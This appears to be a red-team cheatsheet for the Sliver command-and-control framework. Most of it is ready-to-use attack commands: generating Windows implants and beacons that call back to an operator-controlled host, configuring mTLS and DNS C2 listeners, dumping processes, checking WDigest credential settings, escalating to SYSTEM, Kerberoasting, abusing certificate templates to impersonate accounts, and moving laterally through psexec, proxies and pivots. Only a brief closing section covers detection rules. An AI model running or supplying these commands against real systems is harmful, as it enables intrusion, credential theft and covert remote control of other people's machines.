# Sliver Cheatsheet

[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
```go
// Depending on install
// Sometimes not ideal... issues..
sudo sliver
sudo su - ; /root/sliver-server

// Display help
help <command>

// For multi-client
multiplayer 
new-operator
// Connect with Client

// View all implants
implants
// Generate Beacons and Sessions
generate
// Provide visiblity over what the implant does on victim 
--debug 
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions opsec unsafe
generate --mtls domain.com --os windows --save 
// Beacons are asychronous - more opsec way they sleep and check 
generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save /path/to/directory
// Regenerate
regenerate
// listeners
// Do not accept interfaces as arguemnts like metasploit
mtls -L <lhost> -l <lport> 
wg
https
http
dns // Requires DNS configuration! 
// Jobs to view and manage listners
jobs
jobs -k <job number>
jobs -K <kill all jobs> // -F for force
// Beacons
// Show all beacons, information and checkin time
beacons 
// Remove beacons that missed their last checking by 1 hour or more 
beacons prune  
// Show all bbeacno tasks - task are FIFO
tasks
// Retrieve deatils of a specific task
tasks fetch <ID> 
// Drop down to select with arrow keys
use 
// Interact with sessions
use <id >// Create an interactive sessions
// Inrteract with a session
session -i $id
// CReate interactive session from beacon and wait
interactive
// Examples of execution
execute -o <command>
execute -o icacls "c:\Windows\Temp"
execute -o whoami /all
execute -o net localgroup "administrators"
execute -o net group "domain admins" /domain
// reg query the WDIGEST
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
// Execute powershell to run a powershell script
execute -o powershell "c:\Windows\Temp\BadScript.ps1"
// Process and dumping processes
ps 
procdump -p <PID>
// Upload and Download - use absolute path
upload
download

// With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
getsystem

// Shell
Shell // Comes with an OPSec warning by default for good reason
// Exit shell, be patient wait 30 seconds
exit

```

 Armory
```go
// Within a sessions run a armory package eg:
// Enumeration
seatbelt -h
sharpup audit
// Kerberoasting
rubeus kerberoast
// Certificate Abuse
certify find /vulnerable
// From seamlsess intigence part 2, because this syntax makes it easy to understand than $variableNames
certify request /ca:sv001-dc.corp1.local\\corp1-SV001-DC-CA /template:WebServerVuln /altname:jboss
// openssl pkcs12 -in cert.cer -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
// rubeus to get tgt
rubeus asktgt /user:jboss /certificate:C:\\Windows\\system32\\cert.pfx

// psexec is embedded into sliver good for lateral movement
// Profile creation to use the same configuration
psexec -p <profile> <hostname>
```

Armory
```go
// Because why not
armory install all 
```

Shellcode generation
```go
// Disable shikata ga nai
-f shellcode -G
```

Self-Signed Certificates - [RedSiege](https://redsiege.com/blog/2022/11/introduction-to-sliver/)
```bash
# Kali or Ubuntu 
apt install -y certbot
# Inside Sliver
sliver > https --domain $domain.com --lets-encrypt
# Without Lets encrypt
sliver > https https --domain $domain.com --cert ./cert.pem --key ./key.pem
```

DNS Implants - [RedSiege](https://redsiege.com/blog/2022/11/introduction-to-sliver/)
```go
// DNS configuration
// Create an A record ns1.$domain.com
// Create an NBS record cdn.$domain.com pointing to ns1.$domain.com
// Then in Sliver
// Make sure to append a . to the end to conform with DNS protocol
generate beacon --dns cdn.$domain.com.
// Start listener
dns --domain cdn.$domain.com.
```

Profiles *"are sorts of implant blueprints that define a configuration to be reused"*
```go
profiles new --<listenerType> <address> --format 
// symbol obfuscation may not work on stagers add:
--skip-symbols
// Formats

```

Stagers
```go

```

Reconfiguration of beacons
```go
reconfig
// Reconfigure becaon interval -i and Jitter -j 
reconfig -i 30s -j 5s
```

Proxies and Pivots
```go
// Either
use <sessionID> 
sessions -i <sessionID>
//
// Proxies
//
// Create a in-band SOCKS proxy inside of sliver
sock5 start
// kill Proxy
socks5 stop -i <id>
//
// Pivots
// 
// Open a pivot port
pivots tcp
// Generate a Pivot Implant 
generate --tcp-pivot 10.10.10.10:6969

```



## Detecting Sliver

Summarised from [seamlessintelligence part 3](https://seamlessintelligence.com.au/sliver_3.html) - please support and read, this is just a cheatsheet:
- **Don’t rely on a single test to create your detection**
- **Don’t rely on a single log field just because it looks unique**
- **Search around the obvious logs for other related logs**
- **Where possible test every rule in both test and production environments**

Detecting Established Sessions:
- MetaData
- File Hash
- Current Directory

Sliver beacon detection:
```powershell 
# Requires Sysmon2
# look for default nomanclature, but this is easily customised -save /path/name.exe
WORD_WORD.exe 

powershell.exe -NoExit -Command[Console]::OutputEncoding=[Text:UTF8Encoding]:UTF8
# by default uses spool.svc to getsystem 
spool.svc
```

`Cyberchef` -> `Regular Expresssion -> Regex: Sliver`  then upload file that you suspect is a Sliver binary. Make sure you set the recipe first or you will crash your browser.

```json
// Language MUST BE: lucene
event.code:8 AND winlog.event_data.TargetImage:(*spoolsv*) AND winlog.event_data.TargetUser:(*
NT* AND *AUTHORITY\\SYSTEM*)
```


## References

[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
[Official Armory](https://github.com/BishopFox/sliver/wiki/Armory#the-official-armory)
[dominicbreuker - Stagers](https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)
[Really Good Cyber attack & defense video](https://www.youtube.com/watch?v=izMMmOaLn9g) , 
[RedSiege](https://redsiege.com/blog/2022/11/introduction-to-sliver/)
[seamlessintelligence part 1](https://seamlessintelligence.com.au/sliver_1.html)
[seamlessintelligence part 2](https://seamlessintelligence.com.au/sliver_2.html)
[seamlessintelligence part 3](https://seamlessintelligence.com.au/sliver_3.html)